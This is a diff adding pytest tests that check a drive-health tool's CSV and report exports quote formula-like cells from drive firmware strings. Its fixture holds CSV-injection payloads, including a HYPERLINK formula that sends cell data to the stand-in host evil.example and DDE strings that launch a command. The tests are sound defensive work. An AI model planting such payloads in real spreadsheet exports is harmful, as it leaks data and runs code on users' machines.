@@ -131,6 +131,57 @@ class TestCSVFormatter:
         assert self._capacity_cells(result) == ["7.68 TB"]
 
 
+class TestCsvFormulaCells:
+    """Drive strings come from firmware; a spreadsheet must never run one as a formula."""
+
+    HOSTILE = {
+        "dut": "/dev/sda",
+        "transport_protocol": "ATA",
+        "model_number": '=HYPERLINK("http://evil.example/?x="&A1,"click")',
+        "serial_number": "@SUM(1+1)*cmd|' /C calc'!A0",
+        "smart_status": "+1+1",
+        "warning_flags": ["-2+3", "DUPLICATE_SERIAL"],
+    }
+
+    def test_scan_csv_neutralises_formula_cells(self) -> None:
+        row = next(csv.DictReader(io.StringIO(CSVFormatter(include_scores=False).format([self.HOSTILE]))))
+        assert row["model_number"] == "'" + self.HOSTILE["model_number"]
+        assert row["serial_number"] == "'" + self.HOSTILE["serial_number"]
+        assert row["smart_status"] == "'+1+1"
+        assert row["warning_flags"] == "'-2+3 | DUPLICATE_SERIAL"
+
+    @pytest.mark.parametrize("value", ["-5", "+3", "42", "-0.5", "960 GB", "WD-WMC3T0123456", "/dev/sda", "A", ""])
+    def test_ordinary_values_are_untouched(self, value: str) -> None:
+        from cdi_health.classes.revert import csv_safe
+
+        assert csv_safe(value) == value
+
+    @pytest.mark.parametrize(
+        "value", ["=1+1", "+1+1", "-2+3", "@SUM(A1)", "\t=1+1", "\r=1+1", "-", "=cmd|' /C calc'!A0"]
+    )
+    def test_formula_like_values_are_quoted(self, value: str) -> None:
+        from cdi_health.classes.revert import csv_safe
+
+        assert csv_safe(value) == "'" + value
+
+    def test_report_csv_neutralises_formula_cells(self, tmp_path) -> None:
+        from cdi_health.classes.reporter import ReportGenerator
+
+        device = {
+            **self.HOSTILE,
+            "media_type": "HDD",
+            "firmware_revision": "-2+3",
+            "vendor": "+1+1",
+        }
+        out = tmp_path / "report.csv"
+        ReportGenerator().generate_csv([device], str(out))
+        with out.open(encoding="utf-8-sig", newline="") as handle:
+            rows = list(csv.reader(handle))
+        cells = [cell for row in rows[1:] for cell in row]
+        assert "'" + self.HOSTILE["model_number"] in cells
+        assert not [cell for cell in cells if cell[:1] in ("=", "+", "@") or (cell[:1] == "-" and cell != "-5")]
+
+
 class TestYAMLFormatter:
     """Test YAMLFormatter."""
 
